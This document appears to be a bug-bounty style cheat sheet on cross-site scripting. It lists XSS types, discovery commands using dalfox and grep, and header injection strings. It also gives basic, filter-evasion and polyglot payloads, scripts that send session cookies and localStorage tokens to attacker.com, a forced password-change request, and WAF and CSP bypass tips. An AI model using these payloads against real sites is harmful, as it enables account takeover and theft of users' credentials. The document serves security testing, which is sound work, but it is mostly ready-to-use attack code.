# Cross-Site Scripting (XSS)

**CWE:** CWE-79 | **OWASP:** A03:2021

---

## Types

**Reflected** — Not persisted. Delivered via URL/param. Requires victim to click a crafted link.

**Stored** — Persisted in database. Fires for every user who views the affected content.

**DOM-based** — Lives entirely in client-side JavaScript. Never touches the server.

**Blind** — Stored XSS that fires in an admin panel or back-office tool you can't directly see.

---

## Discovery

```bash
# Dalfox (fast automated XSS)
dalfox url "https://target.com/search?q=test"
dalfox file urls.txt --follow-redirects

# From all discovered parameters
cat params.txt | dalfox pipe

# DOM XSS sinks to grep in JS files
grep -r "innerHTML\|outerHTML\|document\.write\|insertAdjacentHTML" js/
grep -r "location\.hash\|location\.search\|location\.href" js/
grep -r "eval(\|setTimeout(\|setInterval(" js/

# XSS via HTTP headers
X-Forwarded-For: <script>alert(1)</script>
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

---

## Payloads

```javascript
// Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Filter bypass
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload=alert`1`>
javascript:alert(1)
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

// Attribute injection
" onmouseover="alert(1)
' onerror='alert(1)

// Cookie theft (PoC)
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>

// Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Escalation to Account Takeover

```javascript
// Steal session cookie
<script>
  new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>

// Steal localStorage (JWT tokens)
<script>
  fetch('https://attacker.com/steal?t=' + JSON.stringify(localStorage));
</script>

// Force password change
<script>
  fetch('/account/change-password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=hacked123&confirm=hacked123'
  });
</script>
```

---

## Bypass Techniques

**`script` tag blocked** → use `<img onerror=...>` or `<svg onload=...>`

**Quotes stripped** → use backticks: `` onerror=alert`1` ``

**`alert` blocked** → try `confirm(1)`, `prompt(1)`, `console.log(1)`

**HTML encoded** → double encode: `&amp;lt;script&amp;gt;`

**CSP `script-src 'self'`** → look for JSONP endpoint or Angular template injection

**WAF present** → try Unicode normalization, HTML entities, null bytes

---

## Impact Assessment

**Stored XSS in admin panel** → Critical

**Stored XSS where ATO is possible** → High

**Reflected XSS with cookie theft** → High

**DOM XSS requiring user action** → Medium

**Self-XSS only (no chain possible)** → Low
